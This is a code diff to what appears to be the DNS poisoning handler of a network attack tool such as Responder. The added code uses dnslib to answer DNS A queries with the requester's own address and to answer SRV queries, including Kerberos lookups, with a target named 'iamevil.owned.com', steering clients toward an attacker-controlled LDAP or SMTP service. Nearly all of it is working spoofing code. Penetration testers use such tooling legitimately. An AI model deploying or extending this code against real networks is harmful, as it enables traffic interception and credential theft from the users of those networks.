@@ -17,9 +17,15 @@
 from packets import DNS_Ans
 from SocketServer import BaseRequestHandler
 from utils import *
+from dnslib import *
 
 def ParseDNSType(data):
+	request = DNSRecord.parse(data)
+	print(request)
 	QueryTypeClass = data[len(data)-4:]
+
+	# print text("[!] Query data: {0}".format(repr(data)))
+	# print text("[!] QueryType: {0}".format(repr(QueryTypeClass)))
 
 	# If Type A, Class IN, then answer.
 	return QueryTypeClass == "\x00\x01\x00\x01"
@@ -33,17 +39,46 @@ class DNS(BaseRequestHandler):
 			return None
 
 		try:
+			# data, soc = self.request
+
+			# if ParseDNSType(data) and settings.Config.AnalyzeMode == False:
+			# 	buff = DNS_Ans()
+			# 	buff.calculate(data)
+			# 	soc.sendto(str(buff), self.client_address)
+
+			# 	ResolveName = re.sub(r'[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
+			# 	print color("[*] [DNS] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1)
 			data, soc = self.request
+			request = DNSRecord.parse(data)
+			print(request)
+			reply = DNSRecord(DNSHeader(id=request.header.id, 
+			                            qr=1, 
+			                            aa=1, 
+			                            ra=1),
+			                   q=request.q)
+			if request.q.qtype == QTYPE.A:
+			    reply.add_answer(RR(rname=request.q.qname,
+			    					rtype=QTYPE.A,
+			    					rdata=A(self.client_address[0])))
+			elif request.q.qtype == QTYPE.SRV:
+				if 'kerberos' in str(request.q.qname):
+					port = 389
+				else:
+					port = 25
+				reply.add_answer(RR(rname=request.q.qname,
+									rtype=QTYPE.SRV,
+									rdata=SRV(priority=0, 
+											weight=100,
+											port=port,
+											target="iamevil.owned.com")))
 
-			if ParseDNSType(data) and settings.Config.AnalyzeMode == False:
-				buff = DNS_Ans()
-				buff.calculate(data)
-				soc.sendto(str(buff), self.client_address)
+			print('\n')
+			print(reply)
 
-				ResolveName = re.sub(r'[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
-				print color("[*] [DNS] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1)
+			soc.sendto(reply.pack(), self.client_address)
 
-		except Exception:
+		except Exception as e:
+			print(e)
 			pass
 
 # DNS Server TCP Class
